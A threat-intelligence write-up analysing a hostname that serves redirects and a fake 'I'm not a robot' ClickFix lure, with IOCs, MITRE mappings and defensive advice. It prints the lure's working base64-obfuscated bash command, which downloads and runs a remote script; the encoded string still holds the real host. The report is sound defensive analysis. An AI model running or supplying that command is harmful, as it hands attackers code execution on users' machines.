# OSINT Investigation 02 | Malicious Web Infrastructure & Redirect Behaviour

**Investigation Type:** Passive OSINT / Threat Intelligence \
**Target:** `sos-bg-sof-1[.]exo[.]io` \
**Associated IP:** `194[.]182[.]177[.]119` \
**ASN:** AS61098 - Exoscale \
**Location:** Sofia, Bulgaria \
**Assessment:** Malicious-associated infrastructure / High Confidence

## Objective

assess the reputation, infrastructure, redirect behaviour, fake-verification social engineering, and command-execution activity associated with `sos-bg-sof-1[.]exo[.]io`

The investigation used passive threat-intelligence sources and controlled observation of the web infrastructure. No malicious commands or scripts were executed.

This investigation started from a compromised OSINT tool "my-ip-neighbors[.]com"
<img width="916" height="702" alt="compromised osint tool" src="https://github.com/user-attachments/assets/f7c2de2c-cfa3-4833-ac36-23bdd65b7934" />


## Sources and Tools

* VirusTotal
* URLScan
* AbuseIPDB
* MalwareTips
* My IP Neighbors / other OSINT tool links encountered during the investigation
* Public threat-intelligence sources

##  Domain Reputation | VirusTotal

<img width="1392" height="569" alt="VirusTotalfinding" src="https://github.com/user-attachments/assets/698832a3-0e8c-4f1c-beae-333d338d885f" />

VirusTotal reported:

**3 / 89 security vendors flagged the domain as malicious.**

The vendors identifying the domain as malicious were:

* Chong Lua Dao | Malicious
* CRDF | Malicious
* Forcepoint ThreatSeeker | Malicious


The mixed detection result does not establish that the domain is safe. The three malicious detections are significant when combined with the observed behaviour and independent threat-intelligence reporting.

## Infrastructure Analysis

URLScan associated:

`sos-bg-sof-1[.]exo[.]io`

with:

`194[.]182[.]177[.]119`

The IP belongs to:

**AS61098 | Exoscale**

with the infrastructure located in Sofia, Bulgaria.

This establishes a direct domain-to-IP relationship for the investigated hostname.

## IP Reputation | AbuseIPDB

AbuseIPDB currently reports:

* Abuse confidence: **0%**
* Reports: **0**
* ISP: Exoscale Open Cloud SOF1
* ASN: AS61098
* Usage: Data Center / Web Hosting / Transit
* Location: Sofia, Bulgaria

The lack of AbuseIPDB reports does not establish that the infrastructure is benign. Cloud-hosting IP addresses may host both legitimate and malicious resources.

Therefore, the AbuseIPDB result was treated as supporting context rather than a clean verdict.

## Redirect Chain and Traffic-Distribution Behaviour

An important finding during the investigation was that the redirect behaviour did not originate directly from `sos-bg-sof-1[.]exo[.]io`.

The initial redirector observed during the investigation was:

**`my-ip-neighbors[.]com`**

Links originating from the OSINT/tool environment redirected through `my-ip-neighbors[.]com` before reaching subsequent destinations.

During investigation of these links, different redirects were observed, including redirects to unrelated websites such as news pages and adult-content websites.

A relevant redirect chain can therefore be represented as:

```text
OSINT / Tool URL
       │
       ▼
my-ip-neighbors[.]com
       │
       │  Initial redirector
       ▼
sos-bg-sof-1[.]exo[.]io
       │
       ├────────► Adult-content destination
       │
       ├────────► News / unrelated destination
       │
       └────────► Other suspicious/scam content
```

### Assessment

The observed behaviour is consistent with a **multi-stage redirect or traffic-distribution system**.

`my-ip-neighbors[.]com` appears to act as an **initial redirector**, while `sos-bg-sof-1[.]exo[.]io` represents a subsequent infrastructure point encountered in the redirect chain.

The fact that the same redirect infrastructure can lead visitors to substantially different destinations, including unrelated news and adult-content pages, is consistent with traffic distribution, malvertising, or other redirect-based abuse.

The exact relationship between `my-ip-neighbors[.]com`, `sos-bg-sof-1[.]exo[.]io`, and the final destinations cannot be conclusively established from the available observations alone. However, the observed chain provides a strong reason to treat both domains as suspicious infrastructure and to investigate them together when performing retrospective DNS, proxy, and browser-log searches.

## IOC
| Indicator                     | Role                                     | Assessment                        |
| ----------------------------- | ---------------------------------------- | --------------------------------- |
| `my-ip-neighbors[.]com`       | Initial redirector                       | Suspicious                        |
| `sos-bg-sof-1[.]exo[.]io`     | Subsequent redirect/infrastructure       | Malicious-associated              |
| `194[.]182[.]177[.]119`       | IP associated with `sos-bg-sof-1.exo.io` | Suspicious / malicious-associated |
| Final adult/news destinations | Redirect targets                         | Variable / potentially malicious  |


## Independent Threat-Intelligence Correlation

MalwareTips has previously documented malicious activity involving `sos-bg-sof-1[.]exo[.]io`.

The report describes the hostname being associated with intrusive notifications, malicious redirects, adult content, fake antivirus alerts, gambling advertisements, and other unwanted content. It also describes users reaching the hostname through redirects and malvertising.

This is consistent with the redirect behaviour observed during this investigation.

The combination of:

* VirusTotal detections
* URLScan infrastructure data
* observed redirects
* independent MalwareTips reporting
* command-execution social engineering

provides substantially stronger evidence than any individual reputation source alone.

## Command-Execution Social Engineering
<img width="1074" height="703" alt="FakeCloudKey2" src="https://github.com/user-attachments/assets/f3c8ff25-0804-4d3b-aff7-715f9774b903" />
<img width="348" height="479" alt="FakeCloudKey" src="https://github.com/user-attachments/assets/ef2e67ce-3af2-40f4-ade1-e54476b7d183" />


The command-execution behaviour was observed at the following URL:

```text
hxxps://sos-bg-sof-1[.]exo[.]io/cloudkey2/cloudkey2[.]html?token=w5u5szt0n01r2ra3pd9nlmcx&ts=mu1it3hi&nc=2h01ajcn
```

At the time of analysis, the page presented itself as **“CloudKey”** and displayed an **identity/security verification** prompt stating **“I'm not a robot click to verify”**, followed by a **Continue** button.

This presentation is consistent with a fake verification or **ClickFix-style social-engineering workflow**, where the user is encouraged to perform an action presented as a security check before being instructed to execute attacker-controlled code.

During the investigation, the page attempted to persuade the user to open a command-line interface and paste the following command:

```bash
bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly9iZXRha2FwcGEuZHJjYXJkZW5hc3Vyb2xvZ28uY29tLm14L3VwZGF0ZS5zaCcgfCBiYXNo" | base64 -d)
```

The Base64 component decodes to a command that effectively performs:

```bash
curl -s 'https://[redacted]/update.sh' | bash
```

If executed, the command would download a remote shell script and pipe its contents directly into Bash.

The command was **not executed** during the investigation.

This behaviour significantly increases the confidence that the page is malicious. The combination of a fake security-verification prompt, user interaction, command-line instructions, Base64 obfuscation, remote script retrieval, and direct Bash execution represents a clear endpoint compromise risk.

### Exact URL Structure

```text
sos-bg-sof-1[.]exo[.]io
└── /cloudkey2/cloudkey2[.]html
    ├── token=...
    ├── ts=...
    └── nc=...
```

The parameters appear to provide per-request or campaign-specific values. Their exact purpose was not independently established during the investigation.


## MITRE ATT&CK Mapping

**T1059.004 — Command and Scripting Interpreter: Unix Shell**

The command attempts to execute code through Bash.

**T1027 — Obfuscated/Compressed Files and Information**

Base64 encoding is used to conceal the underlying command.

**T1105 — Ingress Tool Transfer**

`curl` is used to retrieve a remote script.

These mappings describe the observed behaviour. The final payload and its capabilities cannot be determined because the remote script was not executed or retrieved during the investigation.

## Indicators of Compromise

### Domain

```text
sos-bg-sof-1[.]exo[.]io
```

### IP

```text
194[.]182[.]177[.]119
```

### ASN

```text
AS61098 — Exoscale
```

### Behavioural indicators

```text
Unexpected redirects
Traffic distribution to unrelated destinations
Command-line execution lure
Base64-encoded shell command
curl download followed by bash execution
```

## Assessment

**Verdict:** Malicious
**Confidence:** High

The evidence indicates that `sos-bg-sof-1[.]exo[.]io` has been associated with malicious web activity and potentially functions as part of a redirect/traffic-distribution infrastructure.

The strongest evidence consists of:

1. **3/89 VirusTotal vendors identifying the hostname as malicious.**
2. **URLScan correlating the hostname with `194.182.177.119`.**
3. **Observed unexpected redirects to unrelated and potentially malicious destinations.**
4. **Independent MalwareTips reporting describing malicious redirects and unwanted-content campaigns associated with the hostname.**
5. **Observed social engineering attempting to make the user execute an obfuscated Bash command.**
6. **The command downloads a remote script and pipes it directly into Bash.**

The evidence supports treating the hostname and IP as malicious-associated infrastructure.

## Limitations

The exact redirect logic was not fully captured for every request.

The investigation therefore cannot conclusively establish that every destination observed during testing was controlled by the same threat actor.

The remote `update.sh` payload was not executed, so its final functionality remains unknown.

##  Conclusion

The investigation identified a suspicious web infrastructure component associated with `sos-bg-sof-1[.]exo[.]io` and `194[.]182[.]177[.]119`.

The infrastructure demonstrated multiple concerning characteristics, including malicious vendor detections, documented malicious activity, unexpected redirects, and a command-execution lure using an obfuscated Bash command.

The observed redirect behaviour suggests that the hostname may function as a **traffic-distribution or redirect hub**, capable of sending visitors toward different destinations depending on the campaign or request context.

Combined with the attempted `curl | bash` execution technique, the infrastructure should be considered a **high-confidence malicious IOC** and investigated in DNS, proxy, browser, and endpoint telemetry.

Recommended defensive actions include blocking the hostname where appropriate, searching historical DNS/proxy logs for connections to the domain and IP, identifying the original referral sources, and investigating any endpoint where the provided command may have been executed.
